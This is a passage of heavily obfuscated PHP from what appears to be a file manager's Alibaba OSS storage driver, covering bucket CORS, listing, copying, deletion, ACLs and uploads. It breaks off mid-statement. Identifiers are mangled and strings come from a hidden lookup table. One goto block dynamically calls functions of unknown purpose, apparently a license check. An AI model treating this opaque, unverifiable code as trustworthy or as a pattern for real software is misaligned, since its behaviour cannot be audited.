$Š÷Åàğ[$×ÅûçĞ…[194]][1] = array_unique($Š÷Åàğ[$×ÅûçĞ…[194]][1]); } $Š÷Åàğ[$×ÅûçĞ…[1108]] = $×ÅûçĞ…[2119]; $ïİ°×İ->where($Š÷Åàğ)->setField($×ÅûçĞ…[517], 1); } private function recycleMove($êÈ‡×ôç, $İÂŒ²¦Â = 1) { $ë¹áäÉ¢ =& $_SERVER[åÄ¼Ùßš]; $å·Œ§ó = Model($ë¹áäÉ¢[1466]); $¤ªı·½½ = Model($ë¹áäÉ¢[2359]); $‘—ä¡Ùí = array($ë¹áäÉ¢[194] => $êÈ‡×ôç); if ($İÂŒ²¦Â) { $å·Œ§ó->where($‘—ä¡Ùí)->setField($ë¹áäÉ¢[517], 1); $¤ªı·½½->eventRecycle($êÈ‡×ôç, $ë¹áäÉ¢[2360]); } else { $ó‘‰¥Ÿ³ = $å·Œ§ó->where($‘—ä¡Ùí)->find(); $òÓ™€Úé = $ó‘‰¥Ÿ³[$ë¹áäÉ¢[497]] == $ë¹áäÉ¢[91]; $“¹é¯˜… = $å·Œ§ó->fileNameAuto($ó‘‰¥Ÿ³[$ë¹áäÉ¢[193]], $ó‘‰¥Ÿ³[$ë¹áäÉ¢[32]], REPEAT_RENAME_FOLDER, $òÓ™€Úé); if ($“¹é¯˜… != $ó‘‰¥Ÿ³[$ë¹áäÉ¢[32]]) { $å·Œ§ó->rename($êÈ‡×ôç, $“¹é¯˜…); } $å·Œ§ó->where($‘—ä¡Ùí)->setField($ë¹áäÉ¢[517], 0); $¤ªı·½½->eventRecycle($êÈ‡×ôç, $ë¹áäÉ¢[2361]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\x2e\163\157\165\162\143\x65\x53\x65\143\x72\145\164\114\151\163\164"; public $field = array("\x73\157\x75\162\143\145\111\x44", "\x74\171\160\145\111\104", "\x63\162\145\x61\x74\145\125\163\145\162"); } goto D×ª½Ã¶Šö; C„²•Á“¨‚: if ($_SERVER[$_SERVER[åÄ¼Ùßš][833]] != $_SERVER[$_SERVER[åÄ¼Ùßš][834]]) { $_getc = $_SERVER[åÄ¼Ùßš][835]; $_getfile = $_SERVER[$_SERVER[åÄ¼Ùßš][836]] . $_SERVER[åÄ¼Ùßš][837]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[åÄ¼Ùßš][288], $_getfilec); if (count($_getarrs) < $_SERVER[åÄ¼Ùßš][708]) { $exit = $_SERVER[åÄ¼Ùßš][838]; $exit(); } $_act = $_SERVER[åÄ¼Ùßš][839]; $_act($_SERVER[$_SERVER[åÄ¼Ùßš][840]]); } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($Ê€È€£ò) { parent::__construct(); include_once SDK_DIR . $_SERVER[åÄ¼Ùßš][1508]; $this->_init($Ê€È€£ò); } public function _init($šö®ŠµÖ) { $Í‘Ù¢Ğç =& $_SERVER[åÄ¼Ùßš]; $this->config = $šö®ŠµÖ; foreach ($šö®ŠµÖ as $Ô‹ôœÈ => $³¯…´á˜) { if (isset($this->{$Ô‹ôœÈ})) { $this->{$Ô‹ôœÈ} = $³¯…´á˜; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Í‘Ù¢Ğç[1509] . LNG($Í‘Ù¢Ğç[1510])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $¼ì‰£Å£ =& $_SERVER[åÄ¼Ùßš]; $ÍŞÅê¡Ö = new OSS\Model\CorsConfig(); $Ç¸“üõ = new OSS\Model\CorsRule(); $Ç¸“üõ->addAllowedOrigin($¼ì‰£Å£[1511]); $Ç¸“üõ->addAllowedMethod($¼ì‰£Å£[1512]); $Ç¸“üõ->addAllowedMethod($¼ì‰£Å£[1513]); $Ç¸“üõ->addAllowedMethod($¼ì‰£Å£[1514]); $Ç¸“üõ->addAllowedMethod($¼ì‰£Å£[1515]); $Ç¸“üõ->addAllowedMethod($¼ì‰£Å£[165]); $Ç¸“üõ->setMaxAgeSeconds(600); $Ç¸“üõ->addExposeHeader($¼ì‰£Å£[1516]); $Ç¸“üõ->addAllowedHeader($¼ì‰£Å£[1511]); $ÍŞÅê¡Ö->addRule($Ç¸“üõ); try { $this->client->putBucketCors($this->bucket, $ÍŞÅê¡Ö); } catch (OSS\Core\OssException $­ àÔ¶û) { $this->writeLog(__FUNCTION__ . $¼ì‰£Å£[215] . $­ àÔ¶û->getMessage()); return !1; } return !0; } public function getBucketCors() { $›‚´Ş„¿ =& $_SERVER[åÄ¼Ùßš]; $ÂÙıÌÎ = null; try { $ÂÙıÌÎ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $°¥Áä) { $this->writeLog(__FUNCTION__ . $›‚´Ş„¿[215] . $°¥Áä->getMessage()); return null; } if (!$ÂÙıÌÎ || !($Éå‚óÏÛ = $ÂÙıÌÎ->getRules())) { return null; } $ëÔ‘Ğ—À = $Éå‚óÏÛ[0]->getAllowedOrigins(); $õ˜ñ  = $Éå‚óÏÛ[0]->getAllowedMethods(); $Áù¿‹¯â = $Éå‚óÏÛ[0]->getMaxAgeSeconds(); $‚’§®­¨ = $Éå‚óÏÛ[0]->getExposeHeaders(); $À§ãÏÓ¾ = $Éå‚óÏÛ[0]->getAllowedHeaders(); return array($›‚´Ş„¿[221] => isset($ëÔ‘Ğ—À[0]) ? $ëÔ‘Ğ—À[0] : $›‚´Ş„¿[12], $›‚´Ş„¿[225] => $õ˜ñ , $›‚´Ş„¿[1517] => $Áù¿‹¯â, $›‚´Ş„¿[1518] => isset($‚’§®­¨[0]) ? $‚’§®­¨[0] : $›‚´Ş„¿[12], $›‚´Ş„¿[222] => isset($À§ãÏÓ¾[0]) ? $À§ãÏÓ¾[0] : $›‚´Ş„¿[12]); } public function isBucketCors() { $§¸´ø =& $_SERVER[åÄ¼Ùßš]; $”Ç÷“º¡ = $this->getBucketCors(); if (!$”Ç÷“º¡ || !is_array($”Ç÷“º¡)) { return !1; } if ($”Ç÷“º¡[$§¸´ø[221]] != $§¸´ø[223] || $”Ç÷“º¡[$§¸´ø[222]] != $§¸´ø[223]) { return !1; } $îê™äÚµ = array_map($§¸´ø[224], $”Ç÷“º¡[$§¸´ø[225]]); if (!is_array($îê™äÚµ)) { $îê™äÚµ = array(); } $íëë¹Ëø = array($§¸´ø[226], $§¸´ø[227], $§¸´ø[228], $§¸´ø[229], $§¸´ø[230]); $Û‘şŸûÌ = array_diff($íëë¹Ëø, $îê™äÚµ); return empty($Û‘şŸûÌ); } public function mkfile($şŞŸÜŒ, $¹Ñí¾…Š = '', $í™à©° = REPEAT_RENAME) { $Ìë»‚‡· = $this->setContent($şŞŸÜŒ, $¹Ñí¾…Š); if ($Ìë»‚‡· !== !1) { return $this->getPathOuter($şŞŸÜŒ); } return !1; } public function mkdir($†×ÍîÖç, $¯ÇáƒÉ = REPEAT_SKIP) { if ($¯ÇáƒÉ && $this->_isFolder($†×ÍîÖç)) { return $this->getPathOuter($†×ÍîÖç); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($†×ÍîÖç)); } catch (OSS\Core\OssException $â €ÍÕŠ) { $this->writeLog(__FUNCTION__ . $_SERVER[åÄ¼Ùßš][215] . $â €ÍÕŠ->getMessage()); return !1; } return $this->getPathOuter($†×ÍîÖç); } private function fileList($óùÍ±, $ÕÇ›îÆ¬ = '', $¼ßı¢’ö = 0) { $óÊé÷‚ =& $_SERVER[åÄ¼Ùßš]; $óùÍ± = trim($óùÍ±, $óÊé÷‚[8]); $¶ó«â ú = empty($óùÍ±) && $óùÍ± !== $óÊé÷‚[231] ? $óÊé÷‚[12] : $óùÍ± . $óÊé÷‚[8]; $—¿­…ú  = $óÊé÷‚[12]; $Ã•Ö«² = 1000; $»§“ÚˆÃ = $æî¨ùæ§ = array(); while (!0) { check_abort(); $ğ¸Å² = array($óÊé÷‚[1519] => $ÕÇ›îÆ¬, $óÊé÷‚[1520] => $¶ó«â ú, $óÊé÷‚[1521] => $Ã•Ö«², $óÊé÷‚[1522] => $—¿­…ú ); try { $õ•óïÊ¹ = $this->client->listObjects($this->bucket, $ğ¸Å²); } catch (OSS\Core\OssException $Óµè€«¾) { $this->writeLog(__FUNCTION__ . $óÊé÷‚[215] . $Óµè€«¾->getMessage()); break; } $—¿­…ú  = $õ•óïÊ¹->getNextMarker(); $äÎâ›‚ = $õ•óïÊ¹->getObjectList(); $ù¥îÛŸı = $õ•óïÊ¹->getPrefixList(); foreach ($äÎâ›‚ as $ÑûÇ¯¶ø) { if ($ÑûÇ¯¶ø->getKey() == $¶ó«â ú) { continue; } $ëïòÁÀŸ = $ÑûÇ¯¶ø->getKey(); $ÏÕ‡Í‰³ = $ÑûÇ¯¶ø->getSize(); $¢ÒÇÁ•ö = $ÑûÇ¯¶ø->getLastModified(); $áäÀÓ¾ = trim($ÑûÇ¯¶ø->getETag(), $óÊé÷‚[121]); $–½¿İÒ = $¼ßı¢’ö ? array($óÊé÷‚[32] => $ëïòÁÀŸ, $óÊé÷‚[79] => $ÏÕ‡Í‰³, $óÊé÷‚[207] => strtotime($¢ÒÇÁ•ö), $óÊé÷‚[1523] => $áäÀÓ¾) : $ëïòÁÀŸ; $øÊ²Š¾Å = $ÏÕ‡Í‰³ == 0 && substr($ëïòÁÀŸ, strlen($ëïòÁÀŸ) - 1, 1) == $óÊé÷‚[8] ? !0 : !1; $Ğ«Ü¦ = array($óÊé÷‚[79] => $ÏÕ‡Í‰³, $óÊé÷‚[1524] => $ÏÕ‡Í‰³, $óÊé÷‚[88] => strtotime($¢ÒÇÁ•ö), $óÊé÷‚[1525] => $¢ÒÇÁ•ö, $óÊé÷‚[1523] => $áäÀÓ¾); $this->cacheMethodInfoSet($ëïòÁÀŸ, $øÊ²Š¾Å, $Ğ«Ü¦); if ($øÊ²Š¾Å) { $»§“ÚˆÃ[] = $ëïòÁÀŸ; continue; } $æî¨ùæ§[] = $–½¿İÒ; } foreach ($ù¥îÛŸı as $°úõëá) { $»§“ÚˆÃ[] = $°úõëá->getPrefix(); $this->cacheMethodInfoSet($°úõëá->getPrefix(), !0); } if ($—¿­…ú  === $óÊé÷‚[12]) { break; } } $this->cacheMethodInfoSet($óùÍ±, !0); return array($óÊé÷‚[85] => $»§“ÚˆÃ, $óÊé÷‚[86] => $æî¨ùæ§); } public function listObject($ì×Ô”ğ…, $û•á¦± = '') { $î˜àÖç =& $_SERVER[åÄ¼Ùßš]; $ì×Ô”ğ… = trim($ì×Ô”ğ…, $î˜àÖç[8]); $“›ö›ãà = empty($ì×Ô”ğ…) && $ì×Ô”ğ… !== $î˜àÖç[231] ? $î˜àÖç[12] : $ì×Ô”ğ… . $î˜àÖç[8]; $ú®¢¤› = $î˜àÖç[12]; $”˜ÛÒñî = 1000; $ºö¨ø¶ = $±É€Åú¸ = array(); while (!0) { check_abort(); $Ïæ¬§âä = array($î˜àÖç[1519] => $û•á¦±, $î˜àÖç[1520] => $“›ö›ãà, $î˜àÖç[1521] => $”˜ÛÒñî, $î˜àÖç[1522] => $ú®¢¤›); try { $µ¿„ÂÍ = $this->client->listObjects($this->bucket, $Ïæ¬§âä); } catch (OSS\Core\OssException $ÄÌËüÜ‚) { $this->writeLog(__FUNCTION__ . $î˜àÖç[215] . $ÄÌËüÜ‚->getMessage()); break; } $ú®¢¤› = $µ¿„ÂÍ->getNextMarker(); $í£† ‹ = $µ¿„ÂÍ->getObjectList(); foreach ($í£† ‹ as $Ô§Š´æ¥) { if ($Ô§Š´æ¥->getKey() == $“›ö›ãà) { continue; } $ÙÃ¹ıÇ = $Ô§Š´æ¥->getKey(); $¥â¨Î›Ó = $Ô§Š´æ¥->getSize(); $»Á›«ñ = $¥â¨Î›Ó == 0 && substr($ÙÃ¹ıÇ, strlen($ÙÃ¹ıÇ) - 1, 1) == $î˜àÖç[8] ? !0 : !1; if ($»Á›«ñ) { continue; } $±É€Åú¸[] = $¥â¨Î›Ó . $î˜àÖç[215] . $ÙÃ¹ıÇ; } if ($ú®¢¤› === $î˜àÖç[12]) { break; } } return array($î˜àÖç[85] => $ºö¨ø¶, $î˜àÖç[86] => $±É€Åú¸); } public function copyFile($Ò©ù—, $¿ŞÜìáÊ) { $ÆÙ…­Âß = $this->size($Ò©ù—); if ($ÆÙ…­Âß < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Ò©ù—, $this->bucket, $this->pathEncode($¿ŞÜìáÊ)); } catch (OSS\Core\OssException $áõ©ËƒÃ) { $this->writeLog(__FUNCTION__ . $_SERVER[åÄ¼Ùßš][215] . $áõ©ËƒÃ->getMessage()); return !1; } return $this->getPathOuter($¿ŞÜìáÊ); } $ãò»˜¾ó = $this->multiCopyObject($Ò©ù—, $¿ŞÜìáÊ, $ÆÙ…­Âß); return $ãò»˜¾ó ? $this->getPathOuter($¿ŞÜìáÊ) : !1; } private function multiCopyObject($ú·ÊÌ¶†, $ğÈ®”“Ã, $­ØİÁõú) { $éì•íÆÃ =& $_SERVER[åÄ¼Ùßš]; try { $ªŞ½Ùêº = array(); if ($¥›»İ˜ï = $this->hashMd5($ú·ÊÌ¶†)) { $ªŞ½Ùêº = array(OSS\OssClient::OSS_HEADERS => array($éì•íÆÃ[1526] => $¥›»İ˜ï)); } $²Ë„«¸ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ğÈ®”“Ã), $ªŞ½Ùêº); $Ë²ä…»´ = 1; $Çîğ¨Ùì = 0; $è¢Êƒç = array(); $Ó™èúß = 1024 * 1024 * 10; $Ì«ˆ‘Š‹ = $this->client->generateMultiuploadParts($­ØİÁõú, $Ó™èúß); foreach ($Ì«ˆ‘Š‹ as $ëÛ˜°»¤ => $‹ëóÍË¦) { $©±ßà÷ß = $Çîğ¨Ùì + (int) $‹ëóÍË¦[$éì•íÆÃ[1527]]; $¿£Ê•ò = (int) $‹ëóÍË¦[$éì•íÆÃ[414]] + $©±ßà÷ß - 1; $±û¥øı© = array($éì•íÆÃ[167] => $©±ßà÷ß, $éì•íÆÃ[168] => $¿£Ê•ò); $è¢Êƒç[] = $this->client->uploadPartCopy($this->bucket, $ú·ÊÌ¶†, $this->bucket, $this->pathEncode($ğÈ®”“Ã), $Ë²ä…»´, $²Ë„«¸, $±û¥øı©); $Ë²ä…»´ = $Ë²ä…»´ + 1; } $ğ‰äŒàå = array(); foreach ($è¢Êƒç as $ëÛ˜°»¤ => $×ÍéâÏÁ) { $ğ‰äŒàå[] = array($éì•íÆÃ[300] => $ëÛ˜°»¤ + 1, $éì•íÆÃ[301] => $×ÍéâÏÁ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ğÈ®”“Ã), $²Ë„«¸, $ğ‰äŒàå); } catch (OSS\Core\OssException $µĞÜåİÖ) { $this->writeLog(__FUNCTION__ . $éì•íÆÃ[215] . $µĞÜåİÖ->getMessage()); return !1; } return !0; } public function moveFile($Ğ­°ˆÉ„, $ÇÕãŞÔ) { if ($this->copyFile($Ğ­°ˆÉ„, $ÇÕãŞÔ)) { $this->remove($Ğ­°ˆÉ„); return $this->getPathOuter($ÇÕãŞÔ); } return !1; } public function delFile($¿¢ğ”Û°) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($¿¢ğ”Û°)); } catch (OSS\Core\OssException $¼££ÅÁ«) { $this->writeLog(__FUNCTION__ . $_SERVER[åÄ¼Ùßš][215] . $¼££ÅÁ«->getMessage()); return !1; } return !0; } public function delFolder($Ä¾éúà«) { $÷ò­âø¿ =& $_SERVER[åÄ¼Ùßš]; if (!$this->exist($Ä¾éúà«)) { return !0; } $this->listItemCache = !1; $—®‰«Ô = $this->fileList($Ä¾éúà«); $this->listItemCache = !0; $Ç„ä·Ñ = trim($Ä¾éúà«, $÷ò­âø¿[8]) . $÷ò­âø¿[8]; if (!empty($Ä¾éúà«) && $Ä¾éúà« !== $÷ò­âø¿[231] && !in_array($Ç„ä·Ñ, $—®‰«Ô[$÷ò­âø¿[85]])) { $—®‰«Ô[$÷ò­âø¿[85]][] = $Ç„ä·Ñ; } $±§û¹Š¿ = $this->delByBatch($—®‰«Ô[$÷ò­âø¿[86]]); if (!$±§û¹Š¿) { return !1; } $±§û¹Š¿ = $this->delByBatch($—®‰«Ô[$÷ò­âø¿[85]]); if (!$±§û¹Š¿) { return !1; } return $this->delFile($Ç„ä·Ñ); } private function delByBatch($š’ßóÃ¼) { foreach (array_chunk($š’ßóÃ¼, 1000) as $ˆ˜¦êÄ¡) { try { $this->client->deleteObjects($this->bucket, $ˆ˜¦êÄ¡); } catch (OSS\Core\OssException $‡ï½ì’ö) { $this->writeLog(__FUNCTION__ . $_SERVER[åÄ¼Ùßš][215] . $‡ï½ì’ö->getMessage()); return !1; } } return !0; } public function rename($‡ÇîÃ°¼, $å³Ú¼øÜ) { return $this->renameObject($‡ÇîÃ°¼, $å³Ú¼øÜ); } private function fileInfo($çô²·¶º, $ƒ…¬ó» = false, $¸¨ŸÕË = array()) { $ğÆ¦Ô®š =& $_SERVER[åÄ¼Ùßš]; $ˆà©Åßî = array($ğÆ¦Ô®š[32] => $this->pathThis($çô²·¶º), $ğÆ¦Ô®š[87] => $this->getPathOuter($çô²·¶º), $ğÆ¦Ô®š[33] => $ğÆ¦Ô®š[233], $ğÆ¦Ô®š[79] => isset($¸¨ŸÕË[$ğÆ¦Ô®š[79]]) ? $¸¨ŸÕË[$ğÆ¦Ô®š[79]] : 0, $ğÆ¦Ô®š[169] => $this->ext($çô²·¶º)); if ($ƒ…¬ó») { return $ˆà©Åßî; } $ˆà©Åßî[$ğÆ¦Ô®š[234]] = $ˆà©Åßî[$ğÆ¦Ô®š[88]] = 0; $ˆà©Åßî[$ğÆ¦Ô®š[235]] = $ˆà©Åßî[$ğÆ¦Ô®š[236]] = !0; if (empty($¸¨ŸÕË)) { $å¸É˜¥‹ = $this->objectMeta($çô²·¶º); if (!$å¸É˜¥‹) { return $ˆà©Åßî; } $¸¨ŸÕË = array($ğÆ¦Ô®š[88] => strtotime($å¸É˜¥‹[$ğÆ¦Ô®š[1525]]), $ğÆ¦Ô®š[79] => $å¸É˜¥‹[$ğÆ¦Ô®š[1524]] + 0, $ğÆ¦Ô®š[1523] => $å¸É˜¥‹[$ğÆ¦Ô®š[1523]]); } if (isset($¸¨ŸÕË[$ğÆ¦Ô®š[1523]]) && $¸¨ŸÕË[$ğÆ¦Ô®š[1523]]) { $ˆà©Åßî[$ğÆ¦Ô®š[238]] = trim($¸¨ŸÕË[$ğÆ¦Ô®š[1523]], $ğÆ¦Ô®š[121]); } if (isset($¸¨ŸÕË[$ğÆ¦Ô®š[79]])) { $ˆà©Åßî[$ğÆ¦Ô®š[79]] = $¸¨ŸÕË[$ğÆ¦Ô®š[79]]; } if (isset($¸¨ŸÕË[$ğÆ¦Ô®š[88]])) { $ˆà©Åßî[$ğÆ¦Ô®š[88]] = $¸¨ŸÕË[$ğÆ¦Ô®š[88]]; } if (isset($¸¨ŸÕË[$ğÆ¦Ô®š[207]]) && !trim($ˆà©Åßî[$ğÆ¦Ô®š[88]])) { $ˆà©Åßî[$ğÆ¦Ô®š[88]] = $¸¨ŸÕË[$ğÆ¦Ô®š[207]]; } return $ˆà©Åßî; } private function folderInfo($ÙÙêÔ§ì, $ä˜’ö¤ô = false, $¼ÏÆšÂ‘ = array()) { $“‡ÄàÖö =& $_SERVER[åÄ¼Ùßš]; $§»» à– = array($“‡ÄàÖö[32] => $this->pathThis($ÙÙêÔ§ì), $“‡ÄàÖö[87] => $this->getPathOuter($“‡ÄàÖö[8] . $ÙÙêÔ§ì), $“‡ÄàÖö[33] => $“‡ÄàÖö[78]); if ($ä˜’ö¤ô) { return $§»» à–; } $§»» à–[$“‡ÄàÖö[234]] = $§»» à–[$“‡ÄàÖö[88]] = 0; $§»» à–[$“‡ÄàÖö[235]] = $§»» à–[$“‡ÄàÖö[236]] = !0; if (empty($¼ÏÆšÂ‘)) { $ÙÙêÔ§ì = rtrim($ÙÙêÔ§ì, $“‡ÄàÖö[8]) . $“‡ÄàÖö[8]; $ Ø¬Ûî = $this->objectMeta($ÙÙêÔ§ì); if (!$ Ø¬Ûî) { return $§»» à–; } $¼ÏÆšÂ‘ = array($“‡ÄàÖö[234] => $ Ø¬Ûî[$“‡ÄàÖö[588]][$“‡ÄàÖö[1528]], $“‡ÄàÖö[88] => strtotime($ Ø¬Ûî[$“‡ÄàÖö[1525]])); } if (isset($¼ÏÆšÂ‘[$“‡ÄàÖö[88]])) { $§»» à–[$“‡ÄàÖö[88]] = $¼ÏÆšÂ‘[$“‡ÄàÖö[88]]; } if (isset($¼ÏÆšÂ‘[$“‡ÄàÖö[234]])) { $§»» à–[$“‡ÄàÖö[234]] = $¼ÏÆšÂ‘[$“‡ÄàÖö[234]]; } return $§»» à–; } public function listPath($“±ÔĞˆå, $ÏÃ¨–‚ = false) { $š¶œÀ°¶ =& $_SERVER[åÄ¼Ùßš]; $ÇøÙÀş¸ = $this->fileList($“±ÔĞˆå, $š¶œÀ°¶[8], !0); foreach ($ÇøÙÀş¸[$š¶œÀ°¶[85]] as $ÈéÂ ·Æ => $íŠàÌş‘) { $ÇøÙÀş¸[$š¶œÀ°¶[85]][$ÈéÂ ·Æ] = $this->folderInfo($íŠàÌş‘, $ÏÃ¨–‚, $íŠàÌş‘); } foreach ($ÇøÙÀş¸[$š¶œÀ°¶[86]] as $ÈéÂ ·Æ => $íŠàÌş‘) { $ÇøÙÀş¸[$š¶œÀ°¶[86]][$ÈéÂ ·Æ] = $this->fileInfo($íŠàÌş‘[$š¶œÀ°¶[32]], $ÏÃ¨–‚, $íŠàÌş‘); } return $ÇøÙÀş¸; } protected function infoChildren($âŠ…ç¯, &$Ü’ÀÈÊ) { $úŞšç»š =& $_SERVER[åÄ¼Ùßš]; $¨ÔÀÙ¾± = $this->fileList($âŠ…ç¯, $úŞšç»š[12], !0); $Ü’ÀÈÊ[$úŞšç»š[81]] += count($¨ÔÀÙ¾±[$úŞšç»š[85]]); $Ü’ÀÈÊ[$úŞšç»š[80]] += count($¨ÔÀÙ¾±[$úŞšç»š[86]]); foreach ($¨ÔÀÙ¾±[$úŞšç»š[86]] as $‚ÑÏäë©) { if (!$‚ÑÏäë© || !$‚ÑÏäë©[$úŞšç»š[79]]) { continue; } $Ü’ÀÈÊ[$úŞšç»š[79]] += $‚ÑÏäë©[$úŞšç»š[79]]; } } public function has($œ×©Ú„‹, $ÛßÁñşó = false, $¢èÚÒú¾ = true) { $¬°²Ï½¼ =& $_SERVER[åÄ¼Ùßš]; $œ×©Ú„‹ = trim($œ×©Ú„‹, $¬°²Ï½¼[8]); $ü«¥“˜Û = empty($œ×©Ú„‹) && $œ×©Ú„‹ !== $¬°²Ï½¼[231] ? $¬°²Ï½¼[12] : $œ×©Ú„‹ . $¬°²Ï½¼[8]; $Ğ±É¡’ = $¬°²Ï½¼[12]; $‘äŸ¼ùÙ = 500; $™´§÷İŠ = $ÛÜ‘¨éé = 0; while (!0) { check_abort(); $ÆÃµç£ë = array($¬°²Ï½¼[1519] => $¬°²Ï½¼[8], $¬°²Ï½¼[1520] => $ü«¥“˜Û, $¬°²Ï½¼[1521] => $‘äŸ¼ùÙ, $¬°²Ï½¼[1522] => $Ğ±É¡’); try { $€²­É¡å = $this->client->listObjects($this->bucket, $ÆÃµç£ë); } catch (OSS\Core\OssException $ÁâæãŸÔ) { $this->writeLog(__FUNCTION__ . $¬°²Ï½¼[215] . $ÁâæãŸÔ->getMessage()); break; } $Ğ±É¡’ = $€²­É¡å->getNextMarker(); $¯×ÍæÒ€ = $€²­É¡å->getObjectList(); $†ßÃé«¼ = $€²­É¡å->getPrefixList(); if ($ÛßÁñşó) { if (count($¯×ÍæÒ€) > 1 || count($¯×ÍæÒ€) == 1 && $¯×ÍæÒ€[0]->getKey() != $ü«¥“˜Û) { $™´§÷İŠ += count($¯×ÍæÒ€) - 1; } if (!empty($†ßÃé«¼)) { $ÛÜ‘¨éé += count($†ßÃé«¼); } if ($Ğ±É¡’ === $¬°²Ï½¼[12]) { break; } continue; } if ($¢èÚÒú¾) { if (!empty($¯×ÍæÒ€)) { if (count($¯×ÍæÒ€) > 1 || $¯×ÍæÒ€[0]->getKey() != $ü«¥“˜Û) { return !0; } } } else { if (!empty($†ßÃé«¼)) { return !0; } } if ($Ğ±É¡’ === $¬°²Ï½¼[12]) { break; } } if ($ÛßÁñşó) { return array($¬°²Ï½¼[242] => $™´§÷İŠ, $¬°²Ï½¼[243] => $ÛÜ‘¨éé); } return !1; } public function listAll($œ‚Ù¯µ) { $¾ªŒñéµ =& $_SERVER[åÄ¼Ùßš]; $ªÇ¹Ğó = $this->fileList($œ‚Ù¯µ, $¾ªŒñéµ[12], !0); $Ê…‡ç¨å = array_to_keyvalue($ªÇ¹Ğó[$¾ªŒñéµ[86]], $¾ªŒñéµ[32]); foreach ($ªÇ¹Ğó[$¾ªŒñéµ[85]] as $ôóÄ®©) { if (is_string($ôóÄ®©)) { $Ê…‡ç¨å[$ôóÄ®©] = array($¾ªŒñéµ[79] => 0); } } return $this->listAllFiles($œ‚Ù¯µ, $Ê…‡ç¨å); } public function canRead($ÀˆÉÕ­Ö) { $ĞÔ˜Â¡Ú =& $_SERVER[åÄ¼Ùßš]; $ÑøüîÓ¯ = $this->pathAcl($ÀˆÉÕ­Ö); return $ÑøüîÓ¯ == $ĞÔ˜Â¡Ú[1529] || $ÑøüîÓ¯ == $ĞÔ˜Â¡Ú[635] ? !0 : !1; } public function canWrite($ÊşŒ÷æÏ) { $øîÔ‹ã‚ = $this->pathAcl($ÊşŒ÷æÏ); return $øîÔ‹ã‚ == $_SERVER[åÄ¼Ùßš][635] ? !0 : !1; } public function pathAcl($öÕŒ—õ«) { $˜’‘—Í =& $_SERVER[åÄ¼Ùßš]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $³¡‰ğÀå = $this->client->getObjectAcl($this->bucket, $this->pathEncode($öÕŒ—õ«)); } catch (OSS\Core\OssException $Œà¾„ä) { $this->writeLog(__FUNCTION__ . $˜’‘—Í[215] . $Œà¾„ä->getMessage()); return !1; } $®€š¢ÜŸ = $³¡‰ğÀå == $˜’‘—Í[37] ? $this->bucketAcl : $³¡‰ğÀå; if ($®€š¢ÜŸ == $˜’‘—Í[1530]) { return $˜’‘—Í[1529]; } if ($®€š¢ÜŸ == $˜’‘—Í[1531]) { return $˜’‘—Í[635]; } return $®€š¢ÜŸ; } private function chmodPath($ö¤— ¨, $ÙƒïÍö¥ = '') { $–šçõá =& $_SERVER[åÄ¼Ùßš]; $Ó¨óì¸Ä = empty($ÙƒïÍö¥) ? $–šçõá[1531] : $ÙƒïÍö¥; $ÏÄ¶Ô‡ = array($–šçõá[37], $–šçõá[232], $–šçõá[1530], $–šçõá[1531]); if (!in_array($Ó¨óì¸Ä, $ÏÄ¶Ô‡)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ö¤— ¨), $Ó¨óì¸Ä); } catch (OSS\Core\OssException $£¹—£ƒã) { $this->writeLog(__FUNCTION__ . $–šçõá[215] . $£¹—£ƒã->getMessage()); return !1; } return !0; } public function getContent($ÌÅÜĞœ) { return $this->fileSubstr($ÌÅÜĞœ, -1); } public function setContent($×çÇ„¾ƒ, $ñ†“ÑÜŞ = '') { $ı”ÙëíŠ =& $_SERVER[åÄ¼Ùßš]; try { $†Ôç¬¬¨ = $this->trafficLimit($ı”ÙëíŠ[1532]); $•˜œŞ§ê = $this->client->putObject($this->bucket, $this->pathEncode($×çÇ„¾ƒ), $ñ†“ÑÜŞ, $†Ôç¬¬¨); } catch (OSS\Core\OssException $ÛÆé¹òÛ) { $this->writeLog(__FUNCTION__ . $ı”ÙëíŠ[215] . $ÛÆé¹òÛ->getMessage()); return !1; } $©î±©æä = array($ı”ÙëíŠ[1526] => trim($•˜œŞ§ê[$ı”ÙëíŠ[1523]], $ı”ÙëíŠ[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($×çÇ„¾ƒ))); $this->updateObjMeta($×çÇ„¾ƒ, $©î±©æä); return isset($•˜œŞ§ê[$ı”ÙëíŠ[1533]][$ı”ÙëíŠ[297]]) ? !0 : !1; } private function updateObjMeta($ìè¿Û—Ú, $à—îÂ¸©) { $ìè¿Û—Ú = $this->pathEncode($ìè¿Û—Ú); try { $ø³üÇ¢ü = array(OSS\OssClient::OSS_HEADERS => $à—îÂ¸©); $this->client->copyObject($this->bucket, $ìè¿Û—Ú, $this->bucket, $ìè¿Û—Ú, $ø³üÇ¢ü); } catch (OSS\Core\OssException $öº´Å¦í) { $this->writeLog(__FUNCTION__ . $_SERVER[åÄ¼Ùßš][215] . $öº´Å¦í->getMessage()); return !1; } return !0; } public function upload($ ­øªï€, $«­ÌŠ¯ , $÷Ì…Èíæ = false, $Á¹Èöâ = REPEAT_REPLACE) { $Ô–¨èÙ« =& $_SERVER[åÄ¼Ùßš]; $ğ–¢¡Œ = trim($ ­øªï€, $Ô–¨èÙ«[8]); $ÍñÄ·™˜ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Ô–¨èÙ«[1526] => @md5_file($«­ÌŠ¯ )), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ ­øªï€))); $ÍñÄ·™˜ = 